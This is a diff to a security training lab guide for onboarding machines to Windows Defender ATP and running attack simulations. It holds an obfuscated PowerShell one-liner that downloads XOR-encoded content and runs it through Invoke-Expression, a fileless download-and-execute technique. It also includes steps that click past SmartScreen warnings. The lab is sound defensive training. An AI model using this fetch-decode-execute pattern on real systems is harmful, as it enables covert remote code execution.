@@ -326,7 +326,7 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 1. [] **Extract the zip file** to your desktop.
 1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
 1. [] In the Windows protected your PC dialog, click the **More info** link and click **Run anyway**.
-1. [] In the User Account Control window, click on **More choices** and select use a different account.
+1. [] In the User Account Control (UAC) window, click on **More choices** and select use a different account.
 
 	> [!NOTE] If you do not see the UAC window, minimize all windows and it will be in the background.
 1. [] Enter the credentials below and click **Yes**:
@@ -361,13 +361,16 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 1. [] Click **Download package** and **Open** when the download dialog pops up.
 2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
 3. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
+1. [] If you get the Windows protected your PC dialog, click the **More info** link and click **Run anyway**.
 4. [] Press **(Y)** to confirm onboarding.
 5. [] Run **Attack Simulation #1 "Automated investigation (fileless attack)"** by following the instructions below:
-	1. [] Open a PowerShell window and click on the code below to type it in the window (please wait until you see **($decryptedBytes))** before pressing **Enter**):
+	1. [] Right-click **on AttackSimulation1.ps1** on the desktop and click **Run with PowerShell**.
+
+	> ![NOTE] A notepad window will launch to show that the attack was successful. Leave the notepad window open and continue with the lab.
 	
-	```
-	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-	```
+	> ![KNOWLEDGE] The powershell commands that are run are in the block below.
+	> 
+	> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
 
 1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password +++@lab.VirtualMachine(AdminPC).Password+++.
 1. [] Run **Attack Simulation #2 "Automated investigation (backdoor)"** by following the instructions below:
